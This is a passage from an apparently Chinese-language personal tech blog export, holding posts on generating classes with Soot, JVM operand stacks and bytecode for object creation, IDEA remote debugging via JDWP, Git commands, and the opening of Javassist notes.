<p>也可以使用过时的Jasmin后端。我们首先构造输出流，该流将使用Jasmin源并输出<code>.class</code>文件。我们可以手动指定文件名，也可以让Soot确定正确的文件名。我们在这里做后者。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_class);</span><br><span class="line">OutputStream streamOut = <span class="keyword">new</span> JasminOutputStream(<span class="keyword">new</span> FileOutputStream(fileName));</span><br><span class="line">PrintWriter writerOut = <span class="keyword">new</span> PrintWriter(<span class="keyword">new</span> OutputStreamWriter(streamOut));</span><br><span class="line">JasminClass jasminClass = <span class="keyword">new</span> soot.jimple.JasminClass(sClass);</span><br><span class="line">jasminClass.print(writerOut);</span><br><span class="line">writerOut.flush();</span><br><span class="line">streamOut.close();</span><br></pre></td></tr></table></figure>

<p>如果我们希望输出简单的源代码而不是<code>.class</code>文件，则可以使用以下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_jimple);</span><br><span class="line">OutputStream streamOut = <span class="keyword">new</span> FileOutputStream(fileName);</span><br><span class="line">PrintWriter writerOut = <span class="keyword">new</span> PrintWriter(<span class="keyword">new</span> OutputStreamWriter(streamOut));</span><br><span class="line">Printer.v().printTo(sClass, writerOut);</span><br><span class="line">writerOut.flush();</span><br><span class="line">streamOut.close();</span><br></pre></td></tr></table></figure>

<p>我们省略了<code>JasminOutputStream</code>，并在上调用<code>printTo</code>方法<code>Printer</code>。</p>
<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="../images/%E4%BD%BF%E7%94%A8soot%E5%88%9B%E5%BB%BA%E7%B1%BB%E6%96%87%E4%BB%B6/image-20200718202705757.png" alt="image-20200718202705757"></p>
<h1 id="源代码环节"><a href="#源代码环节" class="headerlink" title="源代码环节"></a>源代码环节</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//创建两个依赖类</span></span><br><span class="line">        Scene.v().loadClassAndSupport(<span class="string">"java.lang.Object"</span>);</span><br><span class="line">        Scene.v().loadClassAndSupport(<span class="string">"java.lang.System"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//声明目标类HelloWorld，他的父类当然是Object</span></span><br><span class="line">        SootClass sClass = <span class="keyword">new</span> SootClass(<span class="string">"HelloWorld"</span>, Modifier.PUBLIC);</span><br><span class="line">        sClass.setSuperclass(Scene.v().getSootClass(<span class="string">"java.lang.Object"</span>));</span><br><span class="line">        Scene.v().addClass(sClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建main方法，public static void main</span></span><br><span class="line">        SootMethod method = <span class="keyword">new</span> SootMethod(<span class="string">"main"</span>, Arrays.asList(<span class="keyword">new</span> Type[]&#123;ArrayType.v(RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>)&#125;),</span><br><span class="line">                VoidType.v(), Modifier.PUBLIC | Modifier.STATIC);</span><br><span class="line">        sClass.addMethod(method);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建main方法内容，这里需要用到Jimple</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            JimpleBody body = Jimple.v().newBody(method);</span><br><span class="line">            method.setActiveBody(body);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//工具组件</span></span><br><span class="line">            Chain units = body.getUnits();</span><br><span class="line">            Local arg,tmpRef;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//加入局部变量，java.lang.String l0</span></span><br><span class="line">            arg = Jimple.v().newLocal(<span class="string">"l0"</span>, ArrayType.v(RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>));</span><br><span class="line">            body.getLocals().add(arg);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//加入局部变量，java.io.PrintStream tmpRef</span></span><br><span class="line">            tmpRef = Jimple.v().newLocal(<span class="string">"tmpRef"</span>, RefType.v(<span class="string">"java.io.PrintStream"</span>));</span><br><span class="line">            body.getLocals().add(tmpRef);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//组成链，l0 = @parameter0</span></span><br><span class="line">            units.add(Jimple.v().newIdentityStmt(arg,</span><br><span class="line">                    Jimple.v().newParameterRef(ArrayType.v</span><br><span class="line">                            (RefType.v(<span class="string">"java.lang.String"</span>), <span class="number">1</span>), <span class="number">0</span>)));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//继续组成链，tmpRef = java.lang.System.out</span></span><br><span class="line">            units.add(Jimple.v().newAssignStmt(tmpRef, Jimple.v().newStaticFieldRef(</span><br><span class="line">                    Scene.v().getField(<span class="string">"&lt;java.lang.System: java.io.PrintStream out&gt;"</span>).makeRef())));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// insert "tmpRef.println("Hello world!")"</span></span><br><span class="line">            &#123;</span><br><span class="line">                SootMethod toCall = Scene.v().getMethod(<span class="string">"&lt;java.io.PrintStream: void println(java.lang.String)&gt;"</span>);</span><br><span class="line">                units.add(Jimple.v().newInvokeStmt(Jimple.v().newVirtualInvokeExpr(tmpRef, toCall.makeRef(), StringConstant.v(<span class="string">"Hello world!"</span>))));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// insert "return"</span></span><br><span class="line">            units.add(Jimple.v().newReturnVoidStmt());</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        String fileName = SourceLocator.v().getFileNameFor(sClass, Options.output_format_class);</span><br><span class="line">        OutputStream streamOut = <span class="keyword">new</span> JasminOutputStream(<span class="keyword">new</span> FileOutputStream(fileName));</span><br><span class="line">        PrintWriter writerOut = <span class="keyword">new</span> PrintWriter(<span class="keyword">new</span> OutputStreamWriter(streamOut));</span><br><span class="line">        JasminClass jasminClass = <span class="keyword">new</span> soot.jimple.JasminClass(sClass);</span><br><span class="line">        jasminClass.print(writerOut);</span><br><span class="line">        writerOut.flush();</span><br><span class="line">        streamOut.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>#</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Soot</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM操作数栈与局部变量表</title>
    <url>/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>知人者智，自知者明。</p>
</blockquote>
<p>最近在看Java污点分析，逃不开<code>对象.方法</code>调用形式，做个记录，随时更新。</p>
<a id="more"></a>

<h1 id="温故"><a href="#温故" class="headerlink" title="温故"></a>温故</h1><p>动态语言与静态语言</p>
<p>对类型的检查，在编译期就是静态语言，在运行期就是动态语言；</p>
<p>静态语言是判断变量自身的类型信息，动态语言是判断变量值的类型信息</p>
<p>动态语言中，变量没有类型信息，变量值才有类型信息。</p>
<p>Java: String info = “atguigu”;//info = atguigu;会报错 类型不匹配</p>
<p>JS：var name = 123;var name = “sun”;都可以 var就是一个变量的泛化。</p>
<p>方法调用</p>
<p>方法的绑定机制：符号引用转换为调用方法</p>
<p>静态链接：</p>
<p>当一个字节码装进JVM内部的时候，如果被调用的方法在编译器可知，且运行时保持不变。静态链接</p>
<p>动态链接：</p>
<p>当被调用的方法无法在编译期确定下来，只有在程序运行起来，才能确定。动态链接</p>
<p>动态链接：将符号引用直接变成直接引用</p>
<p>在.java-&gt;.class过程中，所有的变量和方法引用都会作为符号引用（#5）保存在class文件的常量池中</p>
<p>比如描述一个方法调用了另外的其他方法，就是通过常量池中指向方法的符号引用来表示的。</p>
<p>动态链接的用途就是去运行时常量池（在方法区里面）里面把这些符号引用转换为调用方法的直接引用。</p>
<blockquote>
<p>重点!!!</p>
<ol>
<li>JVM是<strong>基于栈的计算模型</strong></li>
<li>在解析过程中，每当为Java方法分配栈帧时<ul>
<li>执行每条执行之前，JVM要求该指令的操作数已被压入操作数栈中</li>
<li>在执行指令时，JVM会将该指令所需要的操作数<strong>弹出</strong>，并将该指令的结果重新<strong>压入</strong>栈中</li>
</ul>
</li>
</ol>
</blockquote>
<h1 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h1><p>栈帧是线程私有的，每一个方法对应一个栈帧。</p>
<p>四个主要组成成分：操作数栈，局部变量表，动态链接，方法返回地址。（还有一些附加信息，无所谓了）</p>
<p>重点说两个：局部变量表和操作数栈</p>
<h2 id="局部变量表"><a href="#局部变量表" class="headerlink" title="局部变量表"></a>局部变量表</h2><p>当一个方法被调用时，会使用局部变量表来存储参数值和方法内部的方法局部变量。</p>
<p>他是一个数组，用来存放方法参数和定义在方法内部的方法变量。</p>
<p>可以是引用类型（String等），可以是对象引用，可以是返回地址。</p>
<p>线程私有数据。</p>
<p>如果当前方法是对象实例的成员方法（没有被static修饰），那局部变量表[0]存放的是this的引用。</p>
<p>参数分配完毕后，再根据方法体内部定义的局部变量顺序和作用域分配其余的变量槽。</p>
<p>这里基本数据类型（double long除外）+ 引用类型（String） 都是一个slot ；long double 都是两个slot</p>
<h2 id="操作数栈"><a href="#操作数栈" class="headerlink" title="操作数栈"></a>操作数栈</h2><p>也常称为操作栈，它是一个后入先出栈(LIFO)。</p>
<p>保存程序执行过程中的临时结果，保存中间变量。</p>
<p>当一个方法刚刚开始执行时，其操作数栈是空的，随着方法执行和字节码指令的执行，会从局部变量表或对象实例的字段中复制常量或变量写入到操作数栈，再随着计算的进行将栈中元素出栈到局部变量表或者返回给方法调用者，也就是出栈/入栈操作。一个完整的方法执行期间往往包含多个这样出栈/入栈的过程。</p>
<p>如果被调用的方法带有返回值的话，其返回值将会被压入当前栈帧的操作数栈中。</p>
<h2 id="小例子"><a href="#小例子" class="headerlink" title="小例子"></a>小例子</h2><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317174904301.png" alt="image-20210317174904301"></p>
<p>Javap -v Demo:</p>
<p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317175016279.png" alt="image-20210317175016279"></p>
<p>流程：</p>
<p>操作数栈长度为2，局部变量表长度为4，参数大小为1 pc寄存器地址值：JVM字节码指令</p>
<p>bipush 10从常量池里取出10 放到操作数栈顶</p>
<p>istore_1 将操作数栈中栈顶元素给到局部变量表的1号位置 10（0号位置给了this）</p>
<p>bipush 20从常量池里取出20 放到操作数栈顶</p>
<p>istore_2 将操作数栈中栈顶元素给到局部变量表的2号位置  20</p>
<p>iload1从局部变量表中取出1号元素 10 放到操作数栈栈顶</p>
<p>Iload2从局部变量表中取出2号元素 20 放到操作数栈栈顶</p>
<p>iadd 将当前操作数栈的栈顶两个元素求和 结果放在栈顶</p>
<p>return结束 返回void</p>
<p>再看一个方法调用的：</p>
<p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317203643349.png" alt="image-20210317203643349"></p>
<p>javap -v Main</p>
<p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317203803521.png" alt="image-20210317203803521"></p>
<p>先看创建一个对象：</p>
<p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317205038396.png" alt="image-20210317205038396"></p>
<ol>
<li>执行new指令时，JVM将指向一块<strong>已分配的但未初始化</strong>的内存引用压入操作数栈。此时A类在方法区，堆中创建一个A对象的空间，大小可以确定，一些值会进行默认初始化。</li>
<li>接下来dup就是将操作数栈栈顶的值（对象堆空间的引用值）复制一份，<strong>压入栈顶</strong>。</li>
<li>invokespecial指令将要以这个引用为调用者，调用其构造器<ul>
<li>该指令将<strong>消耗掉</strong>操作数栈上的元素，作为它的调用者和参数</li>
</ul>
</li>
<li>因此，在这之前利用dup<strong>指令</strong>复制一份new指令的结果，并用来调用构造器</li>
</ol>
<p>这里 invokespecial指令结束之后，返回对象的引用为void，栈中元素只有一个引用（之前复制的那个）</p>
<p>接着aload_1，将局部变量表里1号位置的元素（参数args）取出，放在栈顶</p>
<p>接下来invokevitural，调用虚方法method1(args)，这里javap -v A</p>
<img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317223337010.png" alt="image-20210317223337010" style="zoom:50%;">

<p>在method1内部，操作数栈大小为1，局部变量表为2（0号位置本类this）</p>
<p>首先aload_1将参数args放入操作数栈顶</p>
<p>接着areturn，将栈顶元素返回，是引用类型（String）</p>
<p>这时候回到之前main方法的操作数栈，返回的param放在了栈顶。</p>
<p>接着astore_2将返回值param放在了局部变量表的2号位置</p>
<p>此时操作数栈为空</p>
<p>接着继续new出来一个B对象，与上个A对象同理</p>
<p>依旧还是dup之后invokevirtual调用构造方法</p>
<p>之后aload_2将局部变量表里面的2号元素（也就是之前的param拿出来，也就是cmd）放到栈顶</p>
<p>invokevirtual去执行method2（cmd）方法</p>
<p>javap -v B看一下</p>
<img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317224622996.png" alt="image-20210317224622996" style="zoom:50%;">

<p>在method2里面 实例化了C对象 嵌套起来了</p>
<p>在method2里面，操作数栈大小为2，局部变量表大小为2</p>
<p>new-dup-init组合拳生成C对象 接下来调用method3（param）</p>
<p>javap -v C</p>
<img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317225028439.png" alt="image-20210317225028439" style="zoom:50%;">

<p>直接返回param</p>
<p>那么对于method3返回的结果，被B的method2进行了<code>11:areturn</code>返回</p>
<p>返回到哪里 ？ 返回到了调用method2的main方法内部<code>23:areturn</code>地方</p>
<p>作为main函数的最终结果返回。</p>
<h1 id="Java创建对象的过程"><a href="#Java创建对象的过程" class="headerlink" title="Java创建对象的过程"></a>Java创建对象的过程</h1><p><a href="https://mp.weixin.qq.com/s/3cm32TzROaQgyKf1TCl0Rg" target="_blank" rel="noopener">这篇</a>讲得非常好，来总结一下3种主流方法。</p>
<h2 id="new"><a href="#new" class="headerlink" title="new"></a>new</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object obj = <span class="keyword">new</span> Object();</span><br></pre></td></tr></table></figure>

<p>最常用的创建方式。</p>
<p>对应字节码：</p>
<p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210322093031418.png" alt="image-20210322093031418"></p>
<p>在Java中，认为创建一个对象就是调用其构造方法，对于new Object()方法其实就是调用了Object类的无参构造方法，但是在字节码中，<strong>对象的创建和调用构造方法是分开的</strong>。</p>
<p>在上图字节码中，</p>
<p>new指令其实就是在堆中创建一个对象，并把对象的引用压入栈（指代操作数栈，后面同理）中。</p>
<p>dup指令会复制栈上最后的一个元素，然后将这个复制压入栈顶。为什么会有两个呢？</p>
<p>是<a href="https://www.zhihu.com/question/52749416" target="_blank" rel="noopener">因为</a>接下来的invokespecial指令会<strong>消耗</strong>掉操作数栈顶部的一个对象引用，作为传递给构造器的<code>this</code>参数，我们希望在invokespecial调用之后，在操作数栈顶还维持一个指向新建对象的引用，那么就得先在invokespecial之前先复制一份引用，也就是dup的原因。</p>
<h2 id="newInstance方法来创建"><a href="#newInstance方法来创建" class="headerlink" title="newInstance方法来创建"></a>newInstance方法来创建</h2><p>这里，<code>newInstance</code>方法是指<code>Class</code>类中的方法，<code>newInstance</code>方法会调用无参的构造方法创建对象。</p>
<p>两种模板：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">User user = (User)Class.forName(<span class="string">"com.sec.User"</span>).newInstance();</span><br><span class="line"></span><br><span class="line">User user = User<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br></pre></td></tr></table></figure>

<p><code>ldc</code>指令代表将常量池里的引用推入栈顶</p>
<p><code>forName</code>是静态方法 需要invokestatic</p>
<p><code>newInstance</code> 是虚方法，需要invokevirtual</p>
<h2 id="使用反射API来创建对象"><a href="#使用反射API来创建对象" class="headerlink" title="使用反射API来创建对象"></a>使用反射API来创建对象</h2><p>例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;User&gt; cons = User<span class="class">.<span class="keyword">class</span>.<span class="title">getConstructor</span>()</span>;</span><br><span class="line">User user = cons.newInstance();</span><br></pre></td></tr></table></figure>







<h1 id="备忘"><a href="#备忘" class="headerlink" title="备忘"></a>备忘</h1><p>java中没有被static native修饰的方法就是是虚方法</p>
<p>感觉invokespecial init是消耗一个对象内存 不会返回任何东西（或者说返回void） </p>
<p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317231200462.png" alt="image-20210317231200462"></p>
<p>注意最后这个pop弹栈操作，很关键。</p>
<p>首先new-dup出现两个ref在栈中 那么invokespecial会消耗一个对象引用 还会剩一个</p>
<p>最后的pop也就是将最后一个（栈顶）弹出来，操作数栈排空。</p>
<p>invokestatic 是不消耗任何对象引用，静态方法是不需要对象.的格式去调用，直接类.方法就好了</p>
<p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317231143953.png" alt="image-20210317231143953"></p>
<p>invokevirtual是获取通常为this和参数，然后一起进行方法调用。</p>
<img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317232352641.png" alt="image-20210317232352641" style="zoom:50%;">

<img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317232507679.png" alt="image-20210317232507679" style="zoom:50%;">

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA远程调试记录</title>
    <url>/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>天街小雨润如酥，草色遥看近却无。</p>
</blockquote>
<p>记录IDEA远程调试过程。随时更新，参考<a href="https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925#open" target="_blank" rel="noopener">yz</a>。</p>
<a id="more"></a>

<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>点击工具栏的<code>Add Configuration...</code>，点击左侧的<code>+</code>号，选择<code>Remote</code>，如下图：</p>
<p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315144011945.png" alt="image-20210315144011945"></p>
<p>创建之后，复制这段命令，记得要改成<code>suspend=y</code>。</p>
<p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315144220008.png" alt="image-20210315144220008"></p>
<h1 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h1><h2 id="有源码调试"><a href="#有源码调试" class="headerlink" title="有源码调试"></a>有源码调试</h2><p>这里在IDEA自带的终端里演示（系统shell当然也可以）：</p>
<p>cd classes:</p>
<p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315144259091.png" alt="image-20210315144259091"></p>
<p>输入这条命令<code>java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5005 com.sec.Test</code></p>
<p>注意末尾是你的包名类名，执行后终端会等待debug，这时候下断点可以看到终端里会配合输出。</p>
<p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315144746757.png" alt="image-20210315144746757"></p>
<h2 id="无源码-只有jar包"><a href="#无源码-只有jar包" class="headerlink" title="无源码 只有jar包"></a>无源码 只有jar包</h2><p>这种需求更加常见，对于jar包里的代码，下端点调试的想法会更多，记录一下。</p>
<p>首先，这里我是一个maven项目，<code>mvn clean package</code>即可，当然你直接shell打包也行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd src</span><br><span class="line">jar -cvf test.jar *</span><br></pre></td></tr></table></figure>

<p>对于打包好的jar包，可以放在当前的IDEA项目下，右键-&gt;add as library，可以直接反编译源码</p>
<p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315150152050.png" alt="image-20210315150152050"></p>
<p>打开jar包，在想看的地方下端点</p>
<p>执行命令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=<span class="number">5005</span> -cp Test.jar com.sec.Test</span><br></pre></td></tr></table></figure>

<p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315150434825.png" alt="image-20210315150434825"></p>
<p>点击小甲虫就完事了：</p>
<p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315150524937.png" alt="image-20210315150524937"></p>
]]></content>
      <categories>
        <category>IDE</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>Git笔记</title>
    <url>/Git%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>日长似岁闲方觉，事大如天醉亦休。</p>
</blockquote>
<p>整理Git相关知识 ，以及如何与IDEA梦幻联动。随时更新。</p>
<a id="more"></a>



<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><p>本地 add 暂存区 commit -m 本地仓库 git push 远程仓库</p>
<p>git add     提交暂存区</p>
<p>git commit -m “xxx”     提交本地Git仓库</p>
<p>git pull     检查协同操作是否冲突</p>
<p>git push   上传远程仓库</p>
<p>git status  查看本地git任务状态</p>
<p>git log 查看操作日志</p>
<h1 id="实战记录"><a href="#实战记录" class="headerlink" title="实战记录"></a>实战记录</h1><h2 id="新建项目关联远程git仓库"><a href="#新建项目关联远程git仓库" class="headerlink" title="新建项目关联远程git仓库"></a>新建项目关联远程git仓库</h2><p>cd</p>
<p>git init</p>
<p>git add .</p>
<p>git commit -m “push “</p>
<p>git remote add origin GIT_LINK[.git] 关联远程仓库</p>
<p>git pull –rebase origin master 检查/校验 多人开发 </p>
<p>git push -u origin master</p>
<h2 id="更新之后提交至git仓库"><a href="#更新之后提交至git仓库" class="headerlink" title="更新之后提交至git仓库"></a>更新之后提交至git仓库</h2><p>cd</p>
<p>git add FILENAME</p>
<p>git commit -m “修改了xxx”</p>
<p>git pull –rebase origin master</p>
<p>git push -u origin master</p>
<h2 id="删除远程中仓库中的文件"><a href="#删除远程中仓库中的文件" class="headerlink" title="删除远程中仓库中的文件"></a>删除远程中仓库中的文件</h2><p>git rm -r -n –cached 文件/文件夹 预览暂存区中要删除哪些文件（只是预览）</p>
<p>git rm -r –cached 文件/文件夹 直接删除</p>
<p>git commit -m ‘xxx’</p>
<p>git push 提交远程仓库</p>
<p>如果远程+本地+暂存区，一起删除文件：</p>
<p>git rm file_path<br>git commit -m ‘delete somefile’<br>git push</p>
<h2 id="IDEA-amp-Github"><a href="#IDEA-amp-Github" class="headerlink" title="IDEA &amp; Github"></a>IDEA &amp; Github</h2><p>git init : VCS -&gt; Import into Version Control -&gt; Create Git Repositry 选择目标项目文件夹</p>
<p>git add .  : 右键项目 -&gt; Git -&gt; add</p>
<p>(首次配置，之后不用)</p>
<p>git remote : 右键项目 -&gt; Git -&gt; Repository -&gt; Remotes </p>
<p>name：origin</p>
<p>git：粘贴github仓库地址</p>
<p>git commit : 右键项目 -&gt;  commit directory -&gt; 在窗口中选择上传文件 上传记录</p>
<p>git push 右上箭头即可</p>
<p>不好使可以：</p>
<p>git pull </p>
<p>git pull origin master </p>
<p>git pull origin master –allow-unrelated-histories</p>
<p>git push -u origin master -f</p>
<p>对于没有的项目</p>
<p>可以VCS -&gt; Import into Version Control -&gt;Share Project on Github</p>
<p>对于git clone下来的项目，如修改之后想再次提交 可以直接右上push 箭头可以直接提交 commit pull push</p>
<p>红色：未add；<br>绿色：已add、未commit；<br>蓝色：已add、已commit、有改动；<br>灰色：忽略；</p>
]]></content>
      <categories>
        <category>基础工具</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Javassist学习笔记</title>
    <url>/Javassist%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>醉里挑灯看剑，梦回吹角连营。</p>
</blockquote>
<p>整理Javassist相关知识 。</p>
<a id="more"></a>

<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>比ASM更适合人类操纵字节码，使用API可以实现例如生成类、修改类的操作。</p>
<p>允许Java程序可以在运行时定义一个新的class、在JVM加载时修改class文件。</p>
<p>提供了2各层次的API：源码级别、字节码级别。</p>
<p>如果用户使用了源码级别的API，就可以在不了解Java字节码规范的情况下编辑class文件。整个API是基于Java语言词汇设计的。你甚至可以以源码文本形式指定插入字节码，javassist编译它是非常快的。</p>
<p>另一方面。字节码层次的API允许用户像其它编辑器一样直接编辑class文件。</p>
<p><a href="http://www.javassist.org/html/index.html" target="_blank" rel="noopener">API文档</a></p>
<h2 id="读写字节码"><a href="#读写字节码" class="headerlink" title="读写字节码"></a>读写字节码</h2><p>Javassist是一个处理字节码的类库。Java字节码存储在一个叫做*.class的二进制文件中。每个class文件包含一个Java类或者接口。</p>
<p><code>javassist.CtClass</code> 代表一个class文件的抽象类表示形式。一个<code>CtClass</code>(compile-time class编译时的类)是一个处理class文件的句柄，以下是一个简单的程序：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.get(<span class="string">"test.Rectangle"</span>);</span><br><span class="line">cc.setSuperclass(pool.get(<span class="string">"test.Point"</span>));</span><br><span class="line">cc.writeFile();</span><br></pre></td></tr></table></figure>

<p>这段程序首先包含一个<code>ClassPool</code>对象，通过Javassist控制字节码的修改。</p>
<p><code>ClassPool</code>对象是代表class文件的<code>CtClass</code>对象的容器。它根据构造一个<code>CtClass</code>对象的需求读取一个class文件，并记录被构建好的对象以供将来进行访问。 为了修改一个类的定义，用户必须首先从<code>ClassPool</code>对象的<code>.get(className)</code>方法获取一个<code>CtClass</code>引用。 </p>
<p>在上述示例中，<code>CtClass</code>对象cc表示<code>ClassPool</code>中的类<code>test.Rectangle</code>，并且将其分配给变量<code>cc</code>。 <code>ClassPool</code>对象由静态方法<code>getDefault</code>方法查找默认的系统检索path返回。格式为“包名.类名”。</p>
<p>从实现上来看，<code>ClassPool</code>是一个<code>CtClass</code>的哈希表，使用class name作为key。</p>
<p><code>ClassPool.get()</code>方法通过检索这个哈希表找到一个<code>CtClass</code>对象关联指定的key。</p>
<p>如果<code>CtClass</code>对象没有找到，<code>get()</code>方法会读取class文件去构造一个<code>CtClass</code>对象，记录在哈希表中然后作为<code>get()</code>的返回值返回。</p>
<p>从<code>ClassPool</code>中获取到的<code>CtClass</code>对象是可以被修改的。在上述示例中，它被修改了 <code>test.Rectangle</code>的父类变更为<code>test.Point</code>,这个修改将会在最后<code>CtClass.writeFile()</code>方法调用后反映在class文件中。</p>
<p>javassist提供了写到类文件的方法：</p>
<p><code>writeFile()</code> 方法将<code>CtClass</code>对象转换到class文件并且将其写入本地磁盘。Javassist也提供了一个方法用于直接获取修改后的字节码：<code>toBytecode()</code>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">byte[] b = cc.toBytecode();</span><br></pre></td></tr></table></figure>

<p>也可以像这样直接加载<code>CtClass</code>:</p>
